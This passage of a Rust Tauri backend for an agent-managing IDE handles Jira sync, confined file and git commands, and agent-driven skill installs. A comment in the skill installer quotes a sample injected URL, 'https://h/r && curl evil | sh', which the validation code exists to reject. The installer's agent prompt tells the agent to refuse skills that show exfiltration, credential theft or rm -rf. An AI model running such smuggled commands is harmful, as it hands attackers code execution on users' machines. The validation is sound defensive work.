    let tasks = if project_id.trim().is_empty() {
        store.list_all_tasks()
    } else {
        let mut t = store.list_tasks(&project_id);
        t.extend(store.list_tasks("")); // include Unassigned
        t
    };
    if tasks.is_empty() {
        return Ok(None);
    }
    let existing: Vec<(String, String, String)> = tasks
        .iter()
        .map(|t| (t.id.clone(), t.title.clone(), t.status.clone()))
        .collect();
    let cand = title.clone();
    let hit = tauri::async_runtime::spawn_blocking(move || judge::check_duplicate(&cand, &existing))
        .await
        .map_err(|e| e.to_string())?;
    Ok(hit.and_then(|h| {
        tasks.iter().find(|t| t.id == h.task_id).map(|t| DuplicateHit {
            task_id: t.id.clone(),
            task_title: t.title.clone(),
            task_status: t.status.clone(),
            reason: h.reason,
        })
    }))
}

// --- Jira (two-way task sync) ---

/// Config returned to the UI — never includes the token, just whether one is set.
#[derive(serde::Serialize)]
struct JiraPublic {
    base_url: String,
    email: String,
    jql: String,
    project_map: std::collections::HashMap<String, String>,
    has_token: bool,
}

/// Result of a pull/sync, for a UI toast.
#[derive(serde::Serialize)]
struct JiraSyncResult {
    pulled: usize,
    created: usize,
    updated: usize,
    /// Issues that landed in Unassigned because their project key isn't mapped.
    unmapped: usize,
}

#[tauri::command]
fn jira_config_get() -> Option<JiraPublic> {
    secrets::load_jira().map(|c| JiraPublic {
        has_token: !c.token.trim().is_empty(),
        base_url: c.base_url,
        email: c.email,
        jql: c.jql,
        project_map: c.project_map,
    })
}

#[tauri::command]
fn jira_config_set(
    base_url: String,
    email: String,
    token: String,
    jql: String,
    project_map: std::collections::HashMap<String, String>,
) -> Result<(), String> {
    // Blank token = keep the one already stored (so editing other fields in the
    // UI doesn't force re-entering the secret).
    let token = if token.trim().is_empty() {
        secrets::load_jira().map(|c| c.token).unwrap_or_default()
    } else {
        token
    };
    // Require https so the Basic-auth token is never sent in cleartext (and to
    // narrow the SSRF surface of the user-supplied base URL). Plain http is only
    // tolerated for a localhost self-hosted instance.
    let b = base_url.trim();
    let is_localhost = b.starts_with("http://localhost")
        || b.starts_with("http://127.0.0.1")
        || b.starts_with("http://[::1]");
    if !(b.starts_with("https://") || is_localhost) {
        return Err("Jira base URL must start with https:// .".into());
    }
    let cfg = secrets::JiraConfig {
        base_url,
        email,
        token,
        jql,
        project_map,
    };
    if !cfg.is_usable() {
        return Err("Base URL, email, and API token are all required.".into());
    }
    secrets::save_jira(Some(cfg))
}

#[tauri::command]
fn jira_disconnect() -> Result<(), String> {
    secrets::save_jira(None)
}

/// Verify the connection by counting issues the JQL matches.
#[tauri::command]
async fn jira_test() -> Result<usize, String> {
    let cfg = secrets::load_jira().ok_or("Jira isn't configured yet.")?;
    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&cfg))
        .await
        .map_err(|e| e.to_string())??;
    Ok(issues.len())
}

/// Pull issues (JQL → tasks) and upsert them by issue key. Status flows
/// Jira→local here; local→Jira flows on `update_task` (transitions).
#[tauri::command]
async fn jira_sync(store: State<'_, Store>) -> Result<JiraSyncResult, String> {
    let cfg = secrets::load_jira().ok_or("Jira isn't configured. Add your token in Settings.")?;
    let map = cfg.project_map.clone();
    let fetch_cfg = cfg.clone();
    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&fetch_cfg))
        .await
        .map_err(|e| e.to_string())??;

    let pulled = issues.len();
    let (mut created, mut updated, mut unmapped) = (0, 0, 0);
    let mut touched_projects: std::collections::HashSet<String> = std::collections::HashSet::new();
    for it in issues {
        // Don't flood the board with already-done Jira issues: only sync a done
        // issue if it's already tracked here (e.g. we completed it in EvorIDE).
        let tracked = store.task_by_external_id("jira", &it.key).is_some();
        if it.status == "done" && !tracked {
            continue;
        }
        let pid = map.get(&it.project_key).cloned().unwrap_or_default();
        if pid.is_empty() {
            unmapped += 1;
        }
        if let Some((_, inserted)) = store.upsert_external_task(
            "jira",
            &it.key,
            Some(&it.url),
            &pid,
            &it.summary,
            &it.status,
            it.description.as_deref(),
        ) {
            if inserted {
                created += 1;
            } else {
                updated += 1;
            }
            if !pid.is_empty() {
                touched_projects.insert(pid);
            }
        }
    }
    // Synced tasks should reach running agents' snapshots without a re-spawn.
    for pid in &touched_projects {
        refresh_task_snapshots(&store, pid);
    }
    Ok(JiraSyncResult {
        pulled,
        created,
        updated,
        unmapped,
    })
}

/// A Jira issue assigned to me, for the "import to my workflow" picker. Live
/// (not stored) — `imported` says whether it's already on the board.
#[derive(serde::Serialize)]
struct JiraIssueDto {
    key: String,
    summary: String,
    status: String,
    /// Real Jira status name (e.g. "In Review"), for display.
    status_name: String,
    description: Option<String>,
    project_key: String,
    url: String,
    imported: bool,
}

/// The issues currently assigned to me on Jira (live), flagged with whether
/// each is already imported as a task. The Tasks page shows these so the user
/// can pull individual tickets into their workflow.
#[tauri::command]
async fn jira_my_issues(store: State<'_, Store>) -> Result<Vec<JiraIssueDto>, String> {
    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&cfg))
        .await
        .map_err(|e| e.to_string())??;
    let imported: std::collections::HashSet<String> = store
        .list_all_tasks()
        .into_iter()
        .filter(|t| t.source == "jira")
        .filter_map(|t| t.external_id)
        .collect();
    Ok(issues
        .into_iter()
        .map(|it| JiraIssueDto {
            imported: imported.contains(&it.key),
            key: it.key,
            summary: it.summary,
            status: it.status,
            status_name: it.status_name,
            description: it.description,
            project_key: it.project_key,
            url: it.url,
        })
        .collect())
}

/// Import a Jira issue into the board as a task (Unassigned — the user/agent
/// relates it to a repo). Returns the created/updated task.
#[tauri::command]
fn jira_import(
    store: State<Store>,
    key: String,
    summary: String,
    status: String,
    description: Option<String>,
    url: String,
    planned_for: Option<String>,
) -> Option<Task> {
    let task = store
        .upsert_external_task("jira", &key, Some(&url), "", &summary, &status, description.as_deref())
        .map(|(t, _)| t)?;
    // "Import to today" — schedule it for the given day so it lands in Today.
    if let Some(day) = planned_for.filter(|d| !d.trim().is_empty()) {
        store.set_task_planned_for(&task.id, &day);
    }
    store.get_task(&task.id)
}

/// A Jira project the account can file into (for the push-to-Jira picker).
#[derive(serde::Serialize)]
struct JiraProjectDto {
    key: String,
    name: String,
}

/// List Jira projects the account can see (for the "which board?" picker).
#[tauri::command]
async fn jira_projects() -> Result<Vec<JiraProjectDto>, String> {
    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
    let ps = tauri::async_runtime::spawn_blocking(move || jira::list_projects(&cfg))
        .await
        .map_err(|e| e.to_string())??;
    Ok(ps.into_iter().map(|(key, name)| JiraProjectDto { key, name }).collect())
}

/// Push a LOCAL task up to Jira: create a new issue and link the task to it. The
/// target board comes from `project_key` if given, else the project mapped to
/// this task's project. Errors if it's already a Jira task or no board is known.
#[tauri::command]
async fn jira_create_from_task(
    store: State<'_, Store>,
    id: String,
    project_key: Option<String>,
) -> Result<Task, String> {
    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
    let task = store.get_task(&id).ok_or("Unknown task.")?;
    if task.source == "jira" && task.external_id.is_some() {
        return Err("This task is already linked to a Jira issue.".into());
    }
    // Explicit board (from the picker) wins; otherwise reverse the project map
    // (Jira KEY → project id) to find where to file it.
    let project_key = project_key
        .filter(|k| !k.trim().is_empty())
        .or_else(|| {
            cfg.project_map
                .iter()
                .find(|(_, pid)| **pid == task.project_id)
                .map(|(k, _)| k.clone())
        })
        .ok_or("Pick a Jira project to file this into.")?;

    let summary = task.title.clone();
    let description = task.description.clone();
    let create_cfg = cfg.clone();
    let (key, url) = tauri::async_runtime::spawn_blocking(move || {
        jira::create_issue(&create_cfg, &project_key, &summary, description.as_deref())
    })
    .await
    .map_err(|e| e.to_string())??;

    store.set_task_external(&id, "jira", &key, &url);
    store.get_task(&id).ok_or_else(|| "Task vanished after linking.".into())
}

/// Let the AI helper assign currently-unassigned tasks to a project by matching
/// their wording to project names/repos. Returns how many it placed. Runs the
/// helper off-thread. (Use after a Jira sync, since one board spans many repos.)
#[tauri::command]
async fn auto_assign_tasks(store: State<'_, Store>) -> Result<usize, String> {
    let unassigned: Vec<(String, String)> = store
        .list_all_tasks()
        .into_iter()
        .filter(|t| t.project_id.trim().is_empty())
        .map(|t| {
            let detail = t.description.as_deref().unwrap_or("");
            let label = if detail.is_empty() {
                t.title.clone()
            } else {
                format!("{} — {}", t.title, detail.chars().take(140).collect::<String>())
            };
            (t.id, label)
        })
        .collect();
    if unassigned.is_empty() {
        return Ok(0);
    }
    let projects: Vec<(String, String, String)> = store
        .list_projects()
        .into_iter()
        .map(|p| (p.id, p.name, p.path))
        .collect();
    if projects.is_empty() {
        return Ok(0);
    }
    let assigns = tauri::async_runtime::spawn_blocking(move || judge::assign_projects(&unassigned, &projects))
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| "No AI helper (claude/codex) found.".to_string())?;
    let mut n = 0;
    for (task_id, project_id) in assigns {
        store.set_task_project(&task_id, &project_id);
        n += 1;
    }
    Ok(n)
}

// --- files ---

// All file commands confine their path to a registered project root first
// (see `guard::confine`) so the webview can't read or write outside the
// projects the user has opened.

#[tauri::command]
fn read_dir(store: State<Store>, path: String) -> Result<Vec<FileEntry>, String> {
    let p = guard::confine(&guard::project_roots(&store), &path)?;
    fs::read_dir(&p.to_string_lossy())
}

#[tauri::command]
fn read_file(store: State<Store>, path: String) -> Result<FileContent, String> {
    let p = guard::confine(&guard::project_roots(&store), &path)?;
    fs::read_file(&p.to_string_lossy())
}

#[tauri::command]
fn write_file(store: State<Store>, path: String, content: String) -> Result<(), String> {
    let p = guard::confine(&guard::project_roots(&store), &path)?;
    fs::write_file(&p.to_string_lossy(), &content)
}

#[tauri::command]
fn create_file(store: State<Store>, path: String) -> Result<(), String> {
    let p = guard::confine(&guard::project_roots(&store), &path)?;
    fs::create_file(&p.to_string_lossy())
}

/// Recursive repo-relative file list for the command palette (Go to File).
#[tauri::command]
fn list_files(store: State<Store>, path: String) -> Vec<String> {
    match guard::confine(&guard::project_roots(&store), &path) {
        Ok(p) => fs::list_files(&p.to_string_lossy()),
        Err(_) => Vec::new(),
    }
}

// --- claude sessions ---

#[tauri::command]
fn claude_sessions(cwd: String) -> Vec<ClaudeSession> {
    claude::list_sessions(&cwd)
}

#[tauri::command]
fn claude_usage(cwd: String) -> Option<ClaudeUsage> {
    claude::usage(&cwd)
}

// --- git ---

#[tauri::command]
fn git_status(cwd: String) -> GitStatus {
    git::status(&cwd)
}

#[tauri::command]
fn git_changes(cwd: String) -> Vec<FileChange> {
    git::changes(&cwd)
}

#[tauri::command]
fn git_diff(cwd: String, file: Option<String>) -> String {
    git::diff(&cwd, file.as_deref())
}

#[tauri::command]
fn git_commit(lock: State<GitLock>, cwd: String, message: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::commit(&cwd, &message)
}

#[tauri::command]
fn git_commit_push(lock: State<GitLock>, cwd: String, message: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::commit_and_push(&cwd, &message)
}

#[tauri::command]
fn git_fetch(lock: State<GitLock>, cwd: String) -> Result<(), String> {
    let _g = lock.0.lock().unwrap();
    git::fetch(&cwd)
}

#[tauri::command]
fn git_pull(lock: State<GitLock>, cwd: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::pull(&cwd)
}

#[tauri::command]
fn git_push(lock: State<GitLock>, cwd: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::push(&cwd)
}

#[tauri::command]
fn git_branches(cwd: String) -> Branches {
    git::branches(&cwd)
}

#[tauri::command]
fn git_checkout(lock: State<GitLock>, cwd: String, branch: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::checkout(&cwd, &branch)
}

#[tauri::command]
fn git_create_branch(lock: State<GitLock>, cwd: String, name: String) -> Result<String, String> {
    let _g = lock.0.lock().unwrap();
    git::create_branch(&cwd, &name)
}

// --- run config ---

#[tauri::command]
fn run_config(project_id: String, path: String) -> Vec<Service> {
    run::services_for(&project_id, &path)
}

#[tauri::command]
fn create_run_config(path: String) -> Result<Vec<Service>, String> {
    run::create_config(&path)
}

/// The instruction to hand an agent so it generates the project's run config at
/// `~/.evoride/{project_id}/runinfo.json` (used by the "Set up run with AI" flow).
#[tauri::command]
fn run_setup_prompt(project_id: String) -> String {
    run::setup_instruction(&project_id)
}

/// Resolve a run-config `subdir` to an absolute path confined to the project
/// root — rejecting absolute paths and `..` so an untrusted config can't point a
/// spawned/run command outside the project (mirrors `spawn_agent`).
fn confined_cwd(project_path: &str, subdir: Option<&str>) -> Result<String, String> {
    match subdir.map(str::trim).filter(|s| !s.is_empty()) {
        Some(sub) => {
            let rel = std::path::Path::new(sub);
            if rel.is_absolute()
                || rel
                    .components()
                    .any(|c| matches!(c, std::path::Component::ParentDir))
            {
                return Err("invalid working directory".into());
            }
            Ok(std::path::Path::new(project_path)
                .join(rel)
                .to_string_lossy()
                .to_string())
        }
        None => Ok(project_path.to_string()),
    }
}

/// Run a command to completion (NOT a pty) and return its combined output tail.
/// Used for one-shot lifecycle commands like `docker compose down` on PAUSE.
/// SECURITY: only allow-listed bare dev tools run (same guard as run-config
/// auto-run), and the cwd is confined to the project — a paused project's
/// manifest / run config is untrusted input, so a tampered `down` command must
/// not become arbitrary code execution. Args go through `.args()` (no shell).
#[tauri::command]
async fn run_command_once(
    store: State<'_, Store>,
    project_id: String,
    command: String,
    subdir: Option<String>,
) -> Result<String, String> {
    let project = store.get_project(&project_id).ok_or("unknown project")?;
    if !run::command_is_trusted(&command) {
        return Err(format!("refusing to run an untrusted command: {command}"));
    }
    let cwd = confined_cwd(&project.path, subdir.as_deref())?;
    tauri::async_runtime::spawn_blocking(move || {
        let mut parts = command.split_whitespace();
        let program = parts.next().unwrap_or_default();
        let mut cmd = std::process::Command::new(program);
        cmd.args(parts);
        cmd.current_dir(&cwd);
        let out = cmd.output().map_err(|e| e.to_string())?;
        let mut s = String::from_utf8_lossy(&out.stdout).into_owned();
        s.push_str(&String::from_utf8_lossy(&out.stderr));
        // Keep the tail, truncated on a char boundary (don't panic on bytes).
        if s.len() > 8192 {
            let from = (s.len() - 8192..=s.len())
                .find(|&i| s.is_char_boundary(i))
                .unwrap_or(s.len());
            s = s[from..].to_string();
        }
        Ok(s)
    })
    .await
    .map_err(|e| e.to_string())?
}

// --- project pause / resume ---

/// Save the manifest of everything suspended by a project PAUSE (agents +
/// services), so Resume can restore it — and so the paused state survives a
/// restart. The manifest is written to `~/.evoride/{id}/pause.json`.
#[tauri::command]
fn save_pause_manifest(project_id: String, manifest: pause::PauseManifest) -> Result<(), String> {
    pause::write(&project_id, &manifest)
}

#[tauri::command]
fn read_pause_manifest(project_id: String) -> Option<pause::PauseManifest> {
    pause::read(&project_id)
}

#[tauri::command]
fn clear_pause_manifest(project_id: String) {
    pause::clear(&project_id);
}

/// Detect long-running stacks (docker/podman compose, tilt) started UNDER a
/// terminal — i.e. typed into its shell or launched by an agent — so PAUSE can
/// tear them down even when they aren't declared run-config services. Best-
/// effort: returns empty if the agent isn't live or the platform has no walk.
#[tauri::command]
fn detect_running_stacks(manager: State<SessionManager>, id: String) -> Vec<proctree::DetectedStack> {
    match manager.child_pid(&id) {
        Some(pid) => proctree::running_under(pid),
        None => Vec::new(),
    }
}

/// Ids of every project currently paused (manifest present) — so the UI shows
/// the Resume state after a restart.
#[tauri::command]
fn paused_projects(store: State<Store>) -> Vec<String> {
    store
        .list_projects()
        .into_iter()
        .map(|p| p.id)
        .filter(|id| pause::is_paused(id))
        .collect()
}

// --- intent docs ---

// Intent commands write managed files (CLAUDE.md/AGENTS.md/.intentflow/…) under
// the project root, so confirm the path IS a registered project root before
// touching anything.
fn require_project_root(store: &Store, path: &str) -> Result<String, String> {
    let roots = guard::project_roots(store);
    let p = guard::confine(&roots, path)?;
    Ok(p.to_string_lossy().into_owned())
}

#[tauri::command]
fn intent_config(store: State<Store>, path: String) -> IntentConfig {
    match require_project_root(&store, &path) {
        Ok(p) => intent::read_config(&p),
        Err(_) => IntentConfig::default(),
    }
}

#[tauri::command]
fn set_intent(
    store: State<Store>,
    path: String,
    enabled: bool,
    mode: String,
) -> Result<IntentConfig, String> {
    let p = require_project_root(&store, &path)?;
    intent::set_enabled(&p, enabled, &mode)
}

#[tauri::command]
fn read_intent(store: State<Store>, path: String) -> String {
    match require_project_root(&store, &path) {
        Ok(p) => intent::read_doc(&p),
        Err(_) => String::new(),
    }
}

#[tauri::command]
fn update_intent(store: State<Store>, path: String) -> Result<String, String> {
    let p = require_project_root(&store, &path)?;
    intent::update(&p)
}

// --- per-agent edits ---

#[tauri::command]
fn agent_edits(project: String, agent_id: String) -> Vec<EditRecord> {
    edits::read_edits(&project, &agent_id)
}

/// Edited-file count per agent for the project (for agent-row badges).
#[tauri::command]
fn agent_edit_counts(project: String) -> std::collections::HashMap<String, usize> {
    edits::edit_counts(&project)
}

// --- misc ---

#[tauri::command]
fn detect_run_command(path: String) -> Option<String> {
    run::detect_run_command(&path)
}

#[tauri::command]
fn home_dir() -> Option<String> {
    fs::home()
}

// --- settings & daily summaries ---

#[tauri::command]
fn get_settings(settings: State<SettingsStore>) -> Settings {
    settings.get()
}

#[tauri::command]
fn set_daily_summary(settings: State<SettingsStore>, enabled: bool) -> Settings {
    settings.set_daily_summary(enabled)
}

#[tauri::command]
fn set_auto_continue_rate_limit(settings: State<SettingsStore>, enabled: bool) -> Settings {
    settings.set_auto_continue_rate_limit(enabled)
}

// --- remote control (evor.dev dashboard) ---

#[tauri::command]
fn remote_status(app: AppHandle) -> remote::RemoteStatus {
    remote::status(&app)
}

/// Save the dashboard URL + enabled flag. A non-empty URL is validated up front
/// so the user can't enable an unreachable/malformed endpoint silently.
#[tauri::command]
fn set_remote_config(
    app: AppHandle,
    url: String,
    enabled: bool,
) -> Result<remote::RemoteStatus, String> {
    let url = url.trim().to_string();
    if !url.is_empty() {
        remote::validate_url(&url)?;
    } else if enabled {
        return Err("enter the dashboard URL first".into());
    }
    app.state::<SettingsStore>().set_remote(url, enabled);
    Ok(remote::status(&app))
}

/// Store (or clear, with an empty/None token) the device bearer token. The token
/// is write-only from the UI's perspective — never read back.
#[tauri::command]
fn set_remote_token(app: AppHandle, token: Option<String>) -> Result<remote::RemoteStatus, String> {
    secrets::save_evor_token(token)?;
    Ok(remote::status(&app))
}

#[tauri::command]
#[allow(clippy::too_many_arguments)]
fn remote_notify(
    app: AppHandle,
    agent_id: String,
    project: String,
    title: String,
    question: String,
    options: Vec<String>,
    text_mode: bool,
    kind: String,
) {
    remote::notify(app, agent_id, project, title, question, options, text_mode, kind);
}

#[tauri::command]
fn remote_resolve(app: AppHandle, agent_id: String) {
    remote::resolve(app, agent_id);
}

// --- mobile access (open this IDE on a phone via the LAN daemon) ---

#[tauri::command]
fn mobile_status(state: State<mobile::MobileState>) -> mobile::MobileStatus {
    state.status()
}

#[tauri::command]
fn mobile_start(
    app: AppHandle,
    state: State<mobile::MobileState>,
    port: Option<u16>,
) -> Result<mobile::MobileStatus, String> {
    state.start(&app, port)
}

#[tauri::command]
fn mobile_stop(state: State<mobile::MobileState>) -> mobile::MobileStatus {
    state.stop()
}

// --- evor.dev cloud link (reach this IDE from anywhere) ---

#[tauri::command]
fn cloud_status(state: State<cloud::CloudState>) -> cloud::CloudStatus {
    state.status()
}

#[tauri::command]
fn cloud_start(
    app: AppHandle,
    state: State<cloud::CloudState>,
) -> Result<cloud::CloudStatus, String> {
    state.start(&app)
}

#[tauri::command]
fn cloud_stop(state: State<cloud::CloudState>) -> cloud::CloudStatus {
    state.stop()
}

/// Pairing QR/link for connecting a phone over the cloud (device id + E2E key).
#[tauri::command]
fn cloud_pairing(app: AppHandle) -> Result<cloud::CloudPairing, String> {
    cloud::pairing(&app)
}

/// One-click "Connect evor.dev": browser loopback login that auto-provisions the
/// device token (no manual paste). Blocking — runs on a command worker.
#[tauri::command]
async fn cloud_login(app: AppHandle) -> Result<connect::Connected, String> {
    tauri::async_runtime::spawn_blocking(move || connect::login(&app))
        .await
        .map_err(|e| e.to_string())?
}

// --- skills ---

/// Bundled skills with their current enabled state, for Settings → Skills.
#[tauri::command]
fn list_skills(settings: State<SettingsStore>) -> Vec<skills::SkillInfo> {
    skills::list(&settings.skills_disabled())
}

/// Toggle a bundled skill: persist the choice and install/remove its files in
/// the global skills dirs so every agent (Claude, Codex, …) picks up the change.
#[tauri::command]
fn set_skill_enabled(settings: State<SettingsStore>, id: String, enabled: bool) {
    settings.set_skill_disabled(&id, !enabled);
    skills::set_enabled(&id, enabled);
}

/// Remove a git-installed (external) skill from every managed root. Bundled
/// skills are toggled via `set_skill_enabled`, not removed.
#[tauri::command]
fn remove_skill(id: String) {
    skills::remove(&id);
}

/// Install a skill from a git repo, driven by Claude Code: it clones the repo,
/// verifies it's a real & safe agent skill (a `SKILL.md` with name+description),
/// and installs it into the global skills dirs (with our managed marker so it
/// shows up + can be removed). Returns a short status line; errors carry why it
/// was refused (not a skill, looked unsafe, no CLI, …). Runs headless so it works
/// even with no project open.
#[tauri::command]
async fn install_skill_from_git(repo: String) -> Result<String, String> {
    let url = repo.trim().to_string();
    if url.is_empty() {
        return Err("Enter a git repository URL.".into());
    }
    // The URL is interpolated into a `git clone … {url}` step that an autonomous
    // agent then runs in ITS OWN shell, so validate it tightly: cleartext http://
    // is dropped (use https/ssh), and any whitespace or shell metacharacter is
    // rejected so a value like `https://h/r && curl evil | sh` or `$(…)` can't
    // turn into agent-shell command injection independent of the safety review.
    let url = url.trim();
    let looks_git =
        url.starts_with("https://") || url.starts_with("git@") || url.starts_with("ssh://");
    if !looks_git {
        return Err("Use an https://…, git@…, or ssh://… URL (http:// isn't allowed).".into());
    }
    if url
        .chars()
        .any(|c| c.is_whitespace() || "\"'`$;|&<>(){}[]\\!*?~\n\r".contains(c))
    {
        return Err("That git URL contains characters that aren't allowed.".into());
    }

    let claude_dir = "~/.claude/skills";
    let agents_dir = "~/.agents/skills";
    let marker = skills::MARKER;
    let marker_body = skills::MARKER_BODY.trim_end();
    let prompt = format!(
        "You are installing an agent SKILL from a git repository for EvorIDE. Work \
autonomously; do not ask me anything. Repo: {url}\n\
1. Shallow-clone it into a temp dir: `git clone --depth 1 {url} <tmp>`.\n\
2. Find a `SKILL.md` (repo root or ONE directory deep). If there is none, it is NOT a \
valid skill — STOP and report that.\n\
3. Read its YAML frontmatter: it must have `name` and `description`. Derive a \
kebab-case skill id from `name` (or the SKILL.md's folder name).\n\
4. SAFETY: skim SKILL.md and any scripts/commands it ships. If it looks malicious or \
destructive (data exfiltration, credential theft, `rm -rf` of home/system, fork bombs, \
etc.), REFUSE — do not install — and report why.\n\
5. If valid AND safe, copy the skill's directory (the folder containing SKILL.md and any \
references) into BOTH `{claude_dir}/<id>/` and `{agents_dir}/<id>/` (create dirs as \
needed; expand ~ to $HOME). In EACH installed dir also write a file named `{marker}` \
containing exactly: {marker_body}\n\
6. Delete the temp clone.\n\
Finish with EXACTLY ONE last line of JSON and nothing after it: \
{{\"installed\":true|false,\"id\":\"<id>\",\"name\":\"<name>\",\"reason\":\"<short>\"}}"
    );

    // Generous bound: clone + reasoning + file copy.
    let raw = tauri::async_runtime::spawn_blocking(move || judge::run_autonomous(&prompt, 240))
        .await
        .map_err(|e| e.to_string())??;

    // Parse the trailing JSON verdict.
    let (Some(s), Some(e)) = (raw.rfind('{'), raw.rfind('}')) else {
        return Err("Couldn't confirm the install (no result from the agent).".into());
    };
    if e < s {
        return Err("Couldn't confirm the install (garbled result).".into());
    }
    let v: serde_json::Value =
        serde_json::from_str(&raw[s..=e]).map_err(|_| "Couldn't parse the install result.".to_string())?;
    let installed = v.get("installed").and_then(|b| b.as_bool()).unwrap_or(false);
    let name = v.get("name").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
    let reason = v.get("reason").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
    if installed {
        let label = if name.is_empty() { "Skill".to_string() } else { name };
        Ok(format!("Installed “{label}”.{}", if reason.is_empty() { String::new() } else { format!(" {reason}") }))
    } else {
        Err(if reason.is_empty() { "The repo isn't a valid/safe skill.".into() } else { reason })
    }
}

/// Markdown summary of activity for a given day (defaults to today). Honors the
/// global daily-summary setting — returns an "off" notice when disabled.
#[tauri::command]
fn daily_summary(
    store: State<Store>,
    settings: State<SettingsStore>,
    date: Option<String>,
) -> String {
    if !settings.get().daily_summary {
        return "Daily summaries are off.".to_string();
    }
    let day = date.filter(|d| !d.trim().is_empty()).unwrap_or_else(summary::today);
    let projects = store.list_projects();
    summary::summary_for(&store, &projects, &day)
}

#[tauri::command]
fn summary_dates(store: State<Store>) -> Vec<String> {
    summary::summary_dates(&store)
}

/// Claude-written narrative for the day (runs `claude -p`, cached per day).
#[tauri::command]
async fn daily_summary_ai(
    app: AppHandle,
    store: State<'_, Store>,
    date: Option<String>,
    force: Option<bool>,
) -> Result<String, String> {
    let day = date.filter(|d| !d.trim().is_empty()).unwrap_or_else(summary::today);
    let force = force.unwrap_or(false);
    let cache_dir = app
        .path()
        .app_data_dir()
        .map_err(|e| e.to_string())?
        .join("summaries");
    // Use the cache unless the user asked to regenerate.
    if !force {
        if let Some(cached) = summary::ai_cached(&cache_dir, &day) {
            return Ok(cached);
        }
    }
    // Build the activity log synchronously (touches the store), then run the
    // blocking `claude -p` call off the IPC thread so the UI stays responsive.
    let projects = store.list_projects();
    let base = summary::ai_base(&store, &projects, &day);
    tauri::async_runtime::spawn_blocking(move || summary::ai_generate(&base, &day, &cache_dir, force))
        .await
        .map_err(|e| e.to_string())?
}

/// Return today's cached AI summary if one exists, without calling the LLM —
/// so the Home view can show the last summary immediately on reopen.
#[tauri::command]
fn daily_summary_ai_cached(app: AppHandle, date: Option<String>) -> Option<String> {
    let day = date.filter(|d| !d.trim().is_empty()).unwrap_or_else(summary::today);
    let cache_dir = app.path().app_data_dir().ok()?.join("summaries");
    summary::ai_cached(&cache_dir, &day)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
/// GUI apps launched from Finder/Dock/`.desktop` inherit a minimal PATH and do
/// NOT source the user's shell profile, so user-installed CLIs (`claude`,
/// `codex`, `node`, …) aren't found and agents fail to spawn — even though the
/// same binary works when run from a terminal. Recover the real PATH from a
/// login+interactive shell once at startup and apply it to this process, so all
/// spawned ptys inherit it. (No-op on Windows, where PATH is normally intact.)
#[cfg(not(target_os = "windows"))]
fn fix_path_env() {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
    // Markers fence the value off from any noise an rc file might print.
    let script = "printf '__EVPATH__%s__EVEND__' \"$PATH\"";
    if let Ok(out) = std::process::Command::new(&shell)
        .args(["-ilc", script])
        .output()
    {
        let s = String::from_utf8_lossy(&out.stdout);
        if let (Some(a), Some(b)) = (s.find("__EVPATH__"), s.find("__EVEND__")) {
            let path = &s[a + "__EVPATH__".len()..b];
            if path.contains('/') {
                std::env::set_var("PATH", path);
            }
        }
    }
}

#[cfg(target_os = "windows")]
fn fix_path_env() {}

pub fn run() {
    // Must run before any agent is spawned so children inherit the real PATH.
    fix_path_env();
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_notification::init())
        .manage(SessionManager::new())
        .manage(GitLock::default())
        .manage(JudgeCache::default())
        .manage(PoppedOut::default())
        .manage(watch::WatchManager::default())
        .manage(mobile::MobileState::default())
        .manage(cloud::CloudState::default())
        .setup(|app| {
            let dir = app
                .path()
                .app_data_dir()
                .expect("app data dir");
            std::fs::create_dir_all(&dir).ok();
            app.manage(Store::load(dir.join("eterm-ide.json")));
            let settings_store = SettingsStore::load(dir.join("settings.json"));
            // Install bundled skills (minus any the user disabled) into the
            // global skills dirs so every agent CLI inherits them — including a
            // fresh install getting the default-on skills on first launch.
            skills::sync(&settings_store.skills_disabled());
            app.manage(settings_store);

            // Ask once for OS-notification permission so "agent needs you" /
            // "agent finished" can surface even when Evor isn't focused.
            notify::request_permission(app.handle());

            // Background poller that applies replies made from the hosted
            // dashboard into the local agent ptys (no-op when remote is off).
            remote::spawn_poller(app.handle().clone());

            // Always-on loopback RPC so the bundled `evor` CLI (src/bin/evor.rs)
            // can act on this app's LIVE state from inside agent ptys. Inject its
            // URL + token into the process env (spawned ptys inherit it); prepend
            // the binary's dir to PATH so `evor` resolves. Best-effort — if it
            // doesn't come up, the CLI falls back to appending the JSONL channel.
            if let Some((url, token)) = localrpc::start(app.handle()) {
                std::env::set_var("EVORIDE_RPC", &url);
                std::env::set_var("EVORIDE_RPC_TOKEN", &token);
            }
            inject_evor_on_path(app.handle());

            // Watch already-open project roots so the file explorer
            // auto-refreshes on external filesystem changes.
            watch_sync(app.handle());

            // Native window menu. File: Open Project / New Window / Home / Quit,
            // plus an Edit submenu (predefined items) so macOS shortcuts work.
            let open_project = MenuItemBuilder::with_id("open-project", "Open Project…").build(app)?;
            let new_window = MenuItemBuilder::with_id("new-window", "New Window").build(app)?;
            let home = MenuItemBuilder::with_id("home", "Home").build(app)?;
            // Preferences — standard ⌘, / Ctrl+, so it's discoverable on both
            // macOS and Windows (the menu bar shows in-window on Windows).
            let settings = MenuItemBuilder::with_id("settings", "Settings…")
                .accelerator("CmdOrCtrl+,")
                .build(app)?;
            let file_menu = SubmenuBuilder::new(app, "File")
                .item(&open_project)
                .item(&new_window)
                .item(&home)
                .separator()
                .item(&settings)
                .separator()
                .item(&PredefinedMenuItem::quit(app, None)?)
                .build()?;
            let edit_menu = SubmenuBuilder::new(app, "Edit")
                .item(&PredefinedMenuItem::undo(app, None)?)
                .item(&PredefinedMenuItem::redo(app, None)?)
                .separator()
